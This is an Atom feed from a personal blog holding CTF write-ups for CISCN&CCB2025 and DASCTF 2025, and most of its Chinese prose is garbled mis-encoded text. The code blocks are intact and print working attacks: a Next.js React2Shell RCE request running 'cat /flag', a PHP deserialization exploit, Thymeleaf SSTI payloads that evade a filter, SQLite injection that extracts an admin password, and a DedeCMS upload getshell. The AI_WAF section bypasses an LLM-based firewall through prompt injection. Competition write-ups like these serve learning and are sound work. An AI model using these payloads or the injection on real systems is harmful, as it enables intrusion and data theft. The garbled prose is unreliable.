<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›²æµã®Lowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2026-01-10T03:47:26.653Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN&amp;CCB2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/12/28/CISCN-CCB2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/12/28/CISCN-CCB2025/</id>
    <published>2025-12-28T02:41:56.000Z</published>
    <updated>2026-01-10T03:47:26.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬åä¹å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆåˆ›æ–°èƒ½åŠ›å®è·µèµ›ï¼‰æš¨ç¬¬ä¸‰å±Šâ€œé•¿åŸæ¯â€ç½‘æ•°æ™ºå®‰å…¨å¤§èµ›ï¼ˆé˜²æŠ¤èµ›ï¼‰åˆèµ›</p><p>ç¥ç§˜ 11 é“ web é¢˜</p><span id="more"></span><hr><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><p>å‰å°æ³¨å†Œä¸€ä¸ªå‰å°è´¦æˆ·å‘ç°æœ‰ä¸€ä¸ª Aa123456789 çš„è´¦æˆ·ï¼Œå°è¯•ç™»å½•å‘ç°æ˜¯ç®¡ç†å‘˜è´¦æˆ·</p><p>Aa123456789:Aa123456789 ç™»å½•åå°</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251230015735247.png"></p><p>è¿›å…¥åå°ï¼Œæ ¸å¿ƒ-æ™®é€šæ–‡ç« -æ·»åŠ æ–‡æ¡£-ç¼©ç•¥å›¾å¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥ä¼ ä¸ªå›¾ç‰‡é©¬æ”¹ php åç¼€ä¸Šå»</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251228114509974.png"></p><p>ç„¶åå°± getshell äº†</p><hr><h1 id="Redjs"><a href="#Redjs" class="headerlink" title="Redjs"></a>Redjs</h1><p>react2shell ç§’äº†</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/apps</span> <span class="token http-version property">HTTP/2.0</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">eci-2zee0kaqistouenwy4dr.cloudeci1.ichunqiu.com:3000</span></span><span class="token header"><span class="token header-name keyword">Next-Action</span><span class="token punctuation">:</span> <span class="token header-value">x</span></span><span class="token header"><span class="token header-name keyword">X-Nextjs-Request-Id</span><span class="token punctuation">:</span> <span class="token header-value">b5dce965</span></span><span class="token header"><span class="token header-name keyword">user-agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">cookie</span><span class="token punctuation">:</span> <span class="token header-value">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1757815655</span></span><span class="token header"><span class="token header-name keyword">accept-encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br, zstd</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">te</span><span class="token punctuation">:</span> <span class="token header-value">trailers</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-site</span><span class="token punctuation">:</span> <span class="token header-value">none</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-user</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span><span class="token header"><span class="token header-name keyword">accept-language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span></span><span class="token header"><span class="token header-name keyword">X-Nextjs-Html-Request-Id</span><span class="token punctuation">:</span> <span class="token header-value">SSTMXm7OJ_g0Ncx6jpQt9</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">740</span></span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="0"</span></span>&#123;  "then": "$1:__proto__:then",  "status": "resolved_model",  "reason": -1,  "value": "&#123;\"then\":\"$B1337\"&#125;",  "_response": &#123;    "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /flag',&#123;'timeout':5000&#125;).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), &#123;digest:`$&#123;res&#125;`&#125;);",    "_chunks": "$Q2",    "_formData": &#123;      "get": "$1:constructor:constructor"    &#125;  &#125;&#125;------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="1"</span></span>"$@0"------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="2"</span></span>[]------WebKitFormBoundaryx8jO2oVc6SWP3Sad--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="hellogate"><a href="#hellogate" class="headerlink" title="hellogate"></a>hellogate</h1><p>è¿›å»ä¸€å¼ å›¾ï¼ŒæŠ“åŒ…ä¸€çœ‹æºç è—åœ¨å“åº”ä½“åº•ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">triggerMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$worker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">worker</span><span class="token operator">-></span><span class="token property">result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$raw</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"muzujijiji.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">triggerMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$worker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">worker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Deprecated"><a href="#Deprecated" class="headerlink" title="Deprecated"></a>Deprecated</h1><p>é«˜èƒ½å›çŒ®ç»™ä¸Šä¸€å±Š ccb å†³èµ›çš„æƒ…ä¹¦å¯¹å—</p><p>é‚£è¿˜è¯´å•¥äº†ï¼Œç›´æ¥æŠ„ a1natas çš„å…¬ä¼—å·å°±æ˜¯äº†</p><p>ç»å…¸ rs256 ä¸ hs256 çš„åå·®</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251230012953532.png"></p><hr><h1 id="EzJava"><a href="#EzJava" class="headerlink" title="EzJava"></a>EzJava</h1><p>é¢˜ç›®æè¿°è¯´åˆ é™¤äº†æ‰€æœ‰çš„ç³»ç»Ÿå‘½ä»¤ï¼Œéœ€è¦è¯»å–æ•æ„Ÿæ–‡ä»¶</p><p>å¼±å£ä»¤ admin:admin123 ç›´æ¥ç™»è¿›å»ï¼Œæœ‰ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“é¢„è§ˆçš„åŠŸèƒ½ï¼Œä¸€çœ¼ thymeleaf</p><p>æµ‹è¯•äº†ä¸‹å‘ç°æœ‰å¦‚ä¸‹æ£€æµ‹æ›¿æ¢ï¼š</p><p><code>T(</code> æ¢æˆ NoNo<br><code>new</code> æ¢æˆ Wow<br><code>flag</code> æ¢æˆ Xxxx</p><p>ç›´æ¥ç”¨ç©ºæ ¼ç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æµ‹ï¼Œå…ˆå°è¯•åˆ—å‡ºç›®å½•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>p th<span class="token operator">:</span>text<span class="token operator">=</span><span class="token string">"$&#123;T (java.util.Arrays).toString(T (java.io.File).listRoots()[0].list())&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯çŸ¥ flag åœ¨ &#x2F;flag_y0u_d0nt_kn0w</p><p>ç„¶åé€šè¿‡ç´¢å¼•è¯»å–å†…å®¹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>p th<span class="token operator">:</span>text<span class="token operator">=</span><span class="token string">"$&#123;T (java.io.File).readAllLines(T (java.nio.files.Paths).get('/'.concat(T (java.io.File).listRoots()[0].list()[19]))).get(0)&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="AI-WAF"><a href="#AI-WAF" class="headerlink" title="AI_WAF"></a>AI_WAF</h1><p>&#x2F;search ä¸€ä¸ª sql æ³¨å…¥ï¼Œè¯´æ˜¯ç”¨ AI è¿›è¡Œ WAF çš„ï¼Œæµ‹äº†ä¸‹åº”è¯¥æ˜¯æ ¹æ® confidence è¶…è¿‡æŸä¸ªå€¼æ¥åˆ¤æ–­æ˜¯å¦æ‹¦æˆªçš„</p><p>fuzz ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ä¸å¯ç”¨<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'SELECT'</span><span class="token punctuation">,</span> <span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">'UNION'</span><span class="token punctuation">,</span> <span class="token string">'union select'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">'WHERE'</span><span class="token punctuation">,</span> <span class="token string">'order'</span><span class="token punctuation">,</span> <span class="token string">'ORDER'</span><span class="token punctuation">,</span> <span class="token string">'group'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'benchmark'</span><span class="token punctuation">,</span> <span class="token string">'concat'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ban å¾—ä¸€å¹²äºŒå‡€ï¼Œæ—¢ç„¶é¢˜ç›®å¼ºè°ƒæ˜¯ AIï¼Œé‚£å°±å°è¯•æç¤ºè¯æ³¨å…¥ï¼Œåœ¨ <code>-- </code> æ³¨é‡Šç¬¦åé¢åŠ ä¸Šè‡ªå·±çš„æç¤ºè¯</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251229223818245.png"></p><hr><h1 id="0o0o0o0o0ï¼ˆUnsolvedï¼‰"><a href="#0o0o0o0o0ï¼ˆUnsolvedï¼‰" class="headerlink" title="0o0o0o0o0ï¼ˆUnsolvedï¼‰"></a>0o0o0o0o0ï¼ˆUnsolvedï¼‰</h1><p>åˆ«ç¬‘ï¼Œæˆ‘æ¥äº†æ²¡è¿‡ç¬¬äºŒå…³</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·ä¸Šå»ï¼Œè®¿é—® data æ¥å£ï¼Œæµ‹è¯•å‘ç° id å­˜åœ¨ sql æ³¨å…¥</p><p>fuzz ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ä¸å¯ç”¨: <span class="token punctuation">[</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'||'</span><span class="token punctuation">,</span> <span class="token string">'order'</span><span class="token punctuation">,</span> <span class="token string">'ORDER'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">,</span> <span class="token string">'mid'</span><span class="token punctuation">,</span> <span class="token string">'left'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'information_schema'</span><span class="token punctuation">,</span> <span class="token string">'database'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'sqlite_master'</span><span class="token punctuation">,</span> <span class="token string">'word'</span><span class="token punctuation">,</span> <span class="token string">'%23'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨é‡Šç¬¦ä¸èƒ½ç”¨ <code>--</code> å’Œ <code>#</code> ï¼Œè€ƒè™‘æ‰‹åŠ¨é—­åˆï¼Œåé¢å‘ç°æ˜¯ sqlite å¯ä»¥æ”¯æŒ <code>/*</code> æ³¨é‡Š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, '</span>test<span class="token string">', 3 where '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥è”åˆæŸ¥è¯¢è¿”å›ä¸‰ä¸ªå›æ˜¾ä½ï¼Œç”±äº database è¢« ban äº†æ²¡æ³•å¾—çŸ¥æ•°æ®åº“åï¼ŒçŒœå‡º users è¡¨</p><p>å› ä¸ºæ˜¯ sqlite æ‰€ä»¥å¯ä»¥æŸ¥ä¸€ä¸‹æœ‰å“ªäº›åˆ—ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, group_concat(name), 3 from pragma_table_info('</span>users<span class="token string">') where '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">|</span>ID<span class="token operator">|</span>Name <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">|</span><span class="token comment">---|---|---|</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span>id<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>email<span class="token punctuation">,</span>password<span class="token punctuation">,</span>role<span class="token punctuation">,</span>username<span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•æŸ¥è¯¢ ADMIN çš„ users</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, role, username from users where role='</span>ADMINIDName <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token number">1</span>user457f285eADMIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ç”±äº password è¢« ban äº†ï¼Œè€ƒè™‘åˆ©ç”¨åˆ«åè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, x.d, 3 from (select 1 a, 2 b, 3 c, 4 d, 5 e, 6 f union select * from users where role = '</span>ADMIN'<span class="token punctuation">)</span> x <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">|</span>ID<span class="token operator">|</span>Name <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">|</span><span class="token comment">---|---|---|</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span>eb3118d7<span class="token operator">-</span><span class="token number">29</span>ba<span class="token operator">-</span><span class="token number">46</span>dc<span class="token operator">-</span><span class="token number">9</span>af3<span class="token operator">-</span><span class="token number">10</span>fdc41510f9<span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ° admin çš„å¯†ç ï¼Œå¯ä»¥ç™»å½•åˆ° admin</p><p>è¿›å» admin panel å‘ç°é‡Œé¢æ˜¯ä¸€ä¸ªä¸Šä¼  excel å¹¶è§£æçš„åŠŸèƒ½ï¼Œä¸ä¼šåšæ¥ä¸åŠäº† ğŸ˜­</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251229222755343.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç¬¬åä¹å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆåˆ›æ–°èƒ½åŠ›å®è·µèµ›ï¼‰æš¨ç¬¬ä¸‰å±Šâ€œé•¿åŸæ¯â€ç½‘æ•°æ™ºå®‰å…¨å¤§èµ›ï¼ˆé˜²æŠ¤èµ›ï¼‰åˆèµ›&lt;/p&gt;
&lt;p&gt;ç¥ç§˜ 11 é“ web é¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>DASCTF 2025ä¸‹åŠå¹´èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/</id>
    <published>2025-12-06T02:42:33.000Z</published>
    <updated>2026-01-08T07:07:41.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ—  pwn æ‰‹ä½œæˆ˜ï¼Œé—æ†¾ç¬¬ä¹</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ">https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg">https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg</a></p><span id="more"></span><hr><h1 id="AIç”»å¸ˆçš„å°ç§˜å¯†"><a href="#AIç”»å¸ˆçš„å°ç§˜å¯†" class="headerlink" title="AIç”»å¸ˆçš„å°ç§˜å¯†"></a>AIç”»å¸ˆçš„å°ç§˜å¯†</h1><p><img src="/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/20251206104312.png"></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="DigitalSignature"><a href="#DigitalSignature" class="headerlink" title="DigitalSignature"></a>DigitalSignature</h2><p>ai æ¢­å‡ºæ¥çš„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token keyword">from</span> eth_account<span class="token punctuation">.</span>messages <span class="token keyword">import</span> encode_defunct<span class="token keyword">from</span> eth_keys <span class="token keyword">import</span> keys<span class="token comment"># ç»™å®šçš„æ•°æ®</span>message <span class="token operator">=</span> <span class="token string">"Find out the signer. Flag is account address that wrapped by DASCTF&#123;&#125;."</span>message_hash <span class="token operator">=</span> <span class="token string">"0x61a78e3c572c1615a6ddd0a0e20157d22b72b8c217cb247318f2c791f4ab6b85"</span>signature <span class="token operator">=</span> <span class="token string">"0x019c4c2968032373cb8e19f13450e93a1abf8658097405cda5489ea22d3779b57815a7e27498057a8c29bcd38f9678b917a887665c1f0d970761cacdd8c41fb61b"</span><span class="token comment"># ä½¿ç”¨web3æ¥æ¢å¤ç­¾åè€…</span>w3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ä»ç­¾åæ¢å¤å…¬é’¥å’Œåœ°å€</span>message_obj <span class="token operator">=</span> encode_defunct<span class="token punctuation">(</span>text<span class="token operator">=</span>message<span class="token punctuation">)</span>recovered_address <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>recover_message<span class="token punctuation">(</span>message_obj<span class="token punctuation">,</span> signature<span class="token operator">=</span>signature<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"æ¢å¤çš„åœ°å€: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>recovered_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># è½¬æ¢ä¸ºchecksumåœ°å€</span>checksum_address <span class="token operator">=</span> w3<span class="token punctuation">.</span>to_checksum_address<span class="token punctuation">(</span>recovered_address<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Checksumåœ°å€: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>checksum_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># ç”Ÿæˆflag</span>flag <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"DASCTF&#123;&#123;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>checksum_address<span class="token punctuation">&#125;</span></span><span class="token string">&#125;&#125;"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SecretPhotoGallery"><a href="#SecretPhotoGallery" class="headerlink" title="SecretPhotoGallery"></a>SecretPhotoGallery</h2><p>ç™»å½•å¤„ password å­˜åœ¨ sqlite æ³¨å…¥ï¼š<code>1&#39;</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SQLite3::query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Unable <span class="token keyword">to</span> <span class="token keyword">prepare</span> statement: <span class="token number">1</span><span class="token punctuation">,</span> unrecognized token: <span class="token string">"'1''"</span>SQLite3::query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Unable <span class="token keyword">to</span> <span class="token keyword">prepare</span> statement: <span class="token number">1</span><span class="token punctuation">,</span> SELECTs <span class="token keyword">to</span> the <span class="token keyword">left</span> <span class="token operator">and</span> <span class="token keyword">right</span> <span class="token keyword">of</span> <span class="token keyword">UNION</span> <span class="token keyword">do</span> <span class="token operator">not</span> have the same number <span class="token keyword">of</span> result <span class="token keyword">columns</span><span aria-hidden="true" 